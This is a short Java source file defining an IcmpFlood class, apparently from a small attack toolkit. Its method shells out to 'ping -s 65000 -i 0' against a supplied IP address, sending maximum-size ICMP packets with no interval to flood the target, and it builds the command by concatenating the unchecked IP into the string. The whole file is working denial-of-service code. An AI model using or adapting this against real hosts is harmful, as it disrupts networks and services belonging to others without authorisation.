package Base;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

/**
 * Created by kenzi on 21/11/2016.
 */
public class IcmpFlood extends Attack {

    public static void icmpAttack(String ip) {

        try {
            Runtime r = Runtime.getRuntime();
            // The maximum ping value (65,000 byte per pinging, without interval)
            Process p = r.exec("ping -s 65000 -i 0 " + ip);

            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                System.out.println(inputLine);
            }
            in.close();

        } catch (IOException e) {
            System.out.println("Error");
        }
    }
}
